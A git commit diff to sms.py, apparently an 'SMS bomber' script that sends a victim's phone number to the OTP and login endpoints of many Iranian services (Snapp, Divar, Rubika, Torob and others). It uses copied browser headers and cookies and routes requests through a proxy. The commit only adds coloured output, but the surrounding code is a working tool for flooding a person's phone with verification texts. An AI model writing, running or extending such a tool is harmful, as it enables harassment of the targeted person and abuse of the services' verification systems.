6f8e7716311891f9fe16a038ae6d0752d193f67b
CharonDefalt <103410775+CharonDefalt@users.noreply.github.com>
2022-08-30 14:24:34 +0430

    Update sms.py

--- sms.py
+++ sms.py
@@ -4,6 +4,7 @@ import os
 import time
 import requests
 from threading import Thread
+from colorama import *
 
 proxy = {"https": "127.0.0.1:8000"}
 
@@ -12,16 +13,16 @@ print (" ")
 
 def snap(phone):
     #snap api
-    snapH = {"Host": "app.snapp.taxi", "content-length": "29", "x-app-name": "passenger-pwa", "x-app-version": "5.0.0", "app-version": "pwa", "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
+    snapH = {"Host": "app.snapp.taxi", "content-length": "16", "x-app-name": "passenger-pwa", "x-app-version": "5.0.1", "app-version": "pwa", "user-agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0", "content-type": "application/json", "accept": "*/*", "origin": "https://app.snapp.taxi", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://app.snapp.taxi/login/?redirect_to\u003d%2F", "accept-encoding": "gzip, deflate, br", "accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6", "cookie": "_gat\u003d1"}
     snapD = {"cellphone":phone}
     try:
         snapR = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD, proxies=proxy)
         if "OK" in snapR.text:
-            print ("sended sms:)")
+            print (Fore.GREEN+"sended sms:)")
         else:
-            print ("Error!")
+            print (Fore.RED+"Error!")
     except:
-        print ("Error!")
+        print (Fore.RED+"Error!")
 
 def shad(phone):
     #shad api
@@ -30,11 +31,11 @@ def shad(phone):
     try:
         shadR = requests.post("https://shadmessenger12.iranlms.ir/", headers=shadH, json=shadD, proxies=proxy)
         if "OK" in shadR.text:
-            print ("sended sms:)")
+            print (Fore.GREEN+"sended sms:)")
         else:
-            print ("Error!")
+            print (Fore.RED+"Error!")
     except:
-        print ("Error!")
+        print (Fore.RED+"Error!")
 
 def gap(phone):
     #gap api
@@ -42,11 +43,11 @@ def gap(phone):
     try:
         gapR = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH, proxies=proxy)
         if "OK" in gapR.text:
-            print ("sended sms:)")
+            print (Fore.GREEN+"sended sms:)")
         else:
-            print ("Error!")
+            print (Fore.RED+"Error!")
     except:
-        print ("Error!")
+        print (Fore.RED+"Error!")
 
 def tap30(phone):
     #tap30 api
@@ -55,21 +56,20 @@ def tap30(phone):
     try:
         tap30R = requests.post("https://tap33.me/api/v2/user", headers=tap30H, json=tap30D, proxies=proxy)
         if "OK" in tap30R.text:
-            print ("sended sms:)")
+            print (Fore.GREEN+"sended sms:)")
         else:
-            print ("Error!")
+            print (Fore.RED+"Error!")
     except:
-            print ("Error!")
-
+            print (Fore.RED+"Error!")
 def emtiaz(phone):
     #emtiaz api
     emH = {"Host": "web.emtiyaz.app","Connection": "keep-alive","Content-Length": "28","Cache-Control": "max-age\u003d0","Upgrade-Insecure-Requests": "1","Origin": "https://web.emtiyaz.app","Content-Type": "application/x-www-form-urlencoded","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","Accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.9","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://web.emtiyaz.app/login","Accept-Encoding": "gzip, deflate, br","Accept-Language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6","Cookie": "__cfduid\u003dd3744e2448268f90a1ea5a4016884f7331596404726; __auc\u003dd86ede5a173b122fb752f98d012; _ga\u003dGA1.2.719537155.1596404727; __asc\u003d7857da15173c7c2e3123fd4c586; _gid\u003dGA1.2.941061447.1596784306; _gat_gtag_UA_124185794_1\u003d1"}
     emD = "send=1&cellphone=0"+phone.split("+98")[1]
     try:
         emR = requests.post("https://web.emtiyaz.app/json/login", headers=emH, data=emD, proxies=proxy)
-        print ("sended sms:)")
+        print (Fore.GREEN+"sended sms:)")
     except:
-        print ("Error!")
+        print (Fore.RED+"Error!")
 
 def divar(phone):
     #divar api
@@ -78,11 +78,11 @@ def divar(phone):
     try:
         divarR = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD, proxies=proxy)
         if "SENT" in divarR.text:
-            print ("sended sms:)")
+            print (Fore.GREEN+"sended sms:)")
         else:
-            print ("Error!")
+            print (Fore.RED+"Error!")
     except:
-        print ("Error!")
+        print (Fore.RED+"Error!")
 
 def rubika(phone):
     #rubika api
@@ -91,11 +91,11 @@ def rubika(phone):
     try:
         ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD, proxies=proxy)
         if "OK" in ruR.text:
-            print ("sended sms:)")
+            print (Fore.GREEN+"sended sms:)")
         else:
-            print ("Error!")
+            print (Fore.RED+"Error!")
     except:
-        print ("Error!")
+        print (Fore.RED+"Error!")
 
 def torob(phone):
     #torob api
@@ -103,11 +103,11 @@ def torob(phone):
     try:
         torobR = requests.get("https://api.torob.com/a/phone/send-pin/?phone_number=0"+phone.split("+98")[1], headers=torobH, proxies=proxy)
         if "sent" in torobR.text:
-            print ("sended sms:)")
+            print (Fore.GREEN+"sended sms:)")
         else:
-            print ("Error!")
+            print (Fore.RED+"Error!")
     except:
-        print ("Error!")
+        print(Fore.RED+"Error!")
 
 def bama(phone):
     #bama api
@@ -116,11 +116,11 @@ def bama(phone):
     try:
         bamaR = requests.post("https://bama.ir/signin-checkforcellnumber", headers=bamaH, data=bamaD, proxies=proxy)
         if "0" in bamaR.text:
-            print ("sended sms:)")
+            print (Fore.GREEN+"sended sms:)")
         else:
-            print ("Error!")
+            print (Fore.RED+"Error!")
     except:
-        print ("Error!")
+        print (Fore.RED+"Error!")
 
 def main():
     phone = str(input("Made by defalt Enter phone number like (+98xxxxxxx): "))
